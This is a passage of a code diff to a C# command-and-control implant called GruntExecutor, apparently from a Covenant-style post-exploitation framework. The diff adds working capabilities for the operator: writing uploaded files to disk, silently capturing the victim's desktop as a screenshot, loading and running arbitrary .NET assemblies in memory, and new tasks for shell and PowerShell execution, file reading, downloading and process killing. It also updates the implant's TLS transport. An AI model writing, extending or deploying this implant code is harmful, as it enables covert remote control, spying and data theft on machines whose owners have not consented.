+                                Native.CREATE_ALWAYS,
+                                Native.FILE_ATTRIBUTE_NORMAL,
+                                IntPtr.Zero);
+
+                            if (hFile.ToInt64() != Native.INVALID_HANDLE_VALUE)
+                            {
+                                try
+                                {
+                                    uint bytesWritten;
+                                    if (Native.WriteFile(hFile, content, (uint)content.Length, out bytesWritten, IntPtr.Zero))
+                                    {
+                                        output += "File uploaded: " + parts[0] + " (" + bytesWritten + " bytes)";
+                                    }
+                                    else
+                                    {
+                                        output += "Error: Failed to write file (code: " + Marshal.GetLastWin32Error() + ")";
+                                    }
+                                }
+                                finally
+                                {
+                                    Native.CloseHandle(hFile);
+                                }
+                            }
+                            else
+                            {
+                                output += "Error: Failed to create file (code: " + Marshal.GetLastWin32Error() + ")";
+                            }
+                        }
+                        else
+                        {
+                            output += "Error: Invalid format. Use: path|base64content";
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        output += "Error: " + ex.Message;
+                    }
+                }
+                else if (message.Type == GruntTaskingType.Screenshot)
+                {
+                    // P/Invoke: GDI32 screenshot using BitBlt
+                    try
+                    {
+                        IntPtr hDesktop = Native.GetDesktopWindow();
+                        IntPtr hDC = Native.GetDC(hDesktop);
+                        Native.RECT rect;
+                        Native.GetWindowRect(hDesktop, out rect);
+
+                        int width = rect.Right - rect.Left;
+                        int height = rect.Bottom - rect.Top;
+
+                        IntPtr hMemDC = Native.CreateCompatibleDC(hDC);
+                        IntPtr hBitmap = Native.CreateCompatibleBitmap(hDC, width, height);
+                        IntPtr hOld = Native.SelectObject(hMemDC, hBitmap);
+
+                        Native.BitBlt(hMemDC, 0, 0, width, height, hDC, 0, 0, Native.SRCCOPY);
+                        Native.SelectObject(hMemDC, hOld);
+
+                        // Get bitmap bits
+                        Native.BITMAPINFO bmi = new Native.BITMAPINFO();
+                        bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(Native.BITMAPINFOHEADER));
+                        bmi.bmiHeader.biWidth = width;
+                        bmi.bmiHeader.biHeight = -height; // Top-down
+                        bmi.bmiHeader.biPlanes = 1;
+                        bmi.bmiHeader.biBitCount = 24;
+                        bmi.bmiHeader.biCompression = Native.BI_RGB;
+                        bmi.bmiColors = new uint[256];
+
+                        int stride = ((width * 3 + 3) / 4) * 4;
+                        byte[] pixels = new byte[stride * height];
+                        Native.GetDIBits(hMemDC, hBitmap, 0, (uint)height, pixels, ref bmi, Native.DIB_RGB_COLORS);
+
+                        // Create BMP file in memory
+                        using (MemoryStream ms = new MemoryStream())
+                        {
+                            // BMP File Header (14 bytes)
+                            ms.Write(new byte[] { 0x42, 0x4D }, 0, 2); // "BM"
+                            int fileSize = 54 + pixels.Length;
+                            ms.Write(BitConverter.GetBytes(fileSize), 0, 4);
+                            ms.Write(new byte[] { 0, 0, 0, 0 }, 0, 4); // Reserved
+                            ms.Write(BitConverter.GetBytes(54), 0, 4); // Offset to pixel data
+
+                            // DIB Header (40 bytes)
+                            ms.Write(BitConverter.GetBytes(40), 0, 4); // Header size
+                            ms.Write(BitConverter.GetBytes(width), 0, 4);
+                            ms.Write(BitConverter.GetBytes(height), 0, 4);
+                            ms.Write(BitConverter.GetBytes((ushort)1), 0, 2); // Planes
+                            ms.Write(BitConverter.GetBytes((ushort)24), 0, 2); // Bits per pixel
+                            ms.Write(BitConverter.GetBytes(0), 0, 4); // Compression
+                            ms.Write(BitConverter.GetBytes(pixels.Length), 0, 4); // Image size
+                            ms.Write(BitConverter.GetBytes(0), 0, 4); // X pixels per meter
+                            ms.Write(BitConverter.GetBytes(0), 0, 4); // Y pixels per meter
+                            ms.Write(BitConverter.GetBytes(0), 0, 4); // Colors used
+                            ms.Write(BitConverter.GetBytes(0), 0, 4); // Important colors
+
+                            // Pixel data (need to flip vertically for BMP format)
+                            for (int y = height - 1; y >= 0; y--)
+                            {
+                                ms.Write(pixels, y * stride, stride);
+                            }
+
+                            output += Convert.ToBase64String(ms.ToArray());
+                        }
+
+                        // Cleanup
+                        Native.DeleteObject(hBitmap);
+                        Native.DeleteDC(hMemDC);
+                        Native.ReleaseDC(hDesktop, hDC);
+                    }
+                    catch (Exception ex)
+                    {
+                        output += "Error: " + ex.Message;
+                    }
+                }
+                else if (message.Type == GruntTaskingType.ExecuteAssembly)
+                {
+                    // Execute .NET assembly in memory - receives base64 assembly and optional parameters
+                    try
+                    {
+                        string[] parts = message.Message.Split(new char[] { '|' }, 2);
+                        byte[] asmBytes = Convert.FromBase64String(parts[0]);
+                        string[] args = parts.Length > 1 && !string.IsNullOrEmpty(parts[1])
+                            ? SplitArgs(parts[1])
+                            : new string[0];
+
+                        Assembly asm = Assembly.Load(asmBytes);
+                        MethodInfo entryPoint = asm.EntryPoint;
+
+                        if (entryPoint != null)
+                        {
+                            // Capture console output
+                            TextWriter realStdOut = Console.Out;
+                            TextWriter realStdErr = Console.Error;
+                            StringWriter sw = new StringWriter();
+                            Console.SetOut(sw);
+                            Console.SetError(sw);
+
+                            try
+                            {
+                                object[] invokeParams = entryPoint.GetParameters().Length > 0
+                                    ? new object[] { args }
+                                    : null;
+                                entryPoint.Invoke(null, invokeParams);
+                            }
+                            finally
+                            {
+                                Console.Out.Flush();
+                                Console.Error.Flush();
+                                Console.SetOut(realStdOut);
+                                Console.SetError(realStdErr);
+                            }
+
+                            output += sw.ToString();
+                        }
+                        else
+                        {
+                            output += "No entry point found in assembly.";
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        output += "Error: " + ex.Message;
+                        if (ex.InnerException != null)
+                            output += Environment.NewLine + "Inner: " + ex.InnerException.Message;
+                    }
                 }
             }
             catch (Exception e)
@@ -367,6 +1224,21 @@ namespace GruntExecutor
                 }
             }
             return WindowsIdentity.GetCurrent().Token;
+        }
+
+        private static string[] SplitArgs(string args)
+        {
+            List<string> result = new List<string>();
+            bool inQuotes = false;
+            string current = "";
+            foreach (char c in args)
+            {
+                if (c == '"') { inQuotes = !inQuotes; }
+                else if (c == ' ' && !inQuotes) { if (current.Length > 0) { result.Add(current); current = ""; } }
+                else { current += c; }
+            }
+            if (current.Length > 0) { result.Add(current); }
+            return result.ToArray();
         }
     }
 
@@ -855,7 +1727,8 @@ namespace GruntExecutor
             this.UseCertPinning = UseCertPinning;
             this.ValidateCert = ValidateCert;
 
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
+            // Use numeric value for Tls12 (3072) for .NET Framework compatibility
+            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
             ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
             {
                 bool valid = true;
@@ -987,7 +1860,6 @@ namespace GruntExecutor
 
     public enum GruntTaskingType
     {
-        Assembly,
         SetDelay,
         SetJitter,
         SetConnectAttempts,
@@ -996,7 +1868,27 @@ namespace GruntExecutor
         Connect,
         Disconnect,
         Tasks,
-        TaskKill
+        TaskKill,
+        Shell,
+        ShellCmd,
+        PowerShell,
+        WhoAmI,
+        Pwd,
+        Cd,
+        ListDirectory,
+        ReadFile,
+        WriteFile,
+        GetHostname,
+        ProcessList,
+        Kill,
+        // New file operations
+        CreateDirectory,
+        Delete,
+        Copy,
+        Download,
+        Upload,
+        Screenshot,
+        ExecuteAssembly
     }
 
     public class GruntTaskingMessage
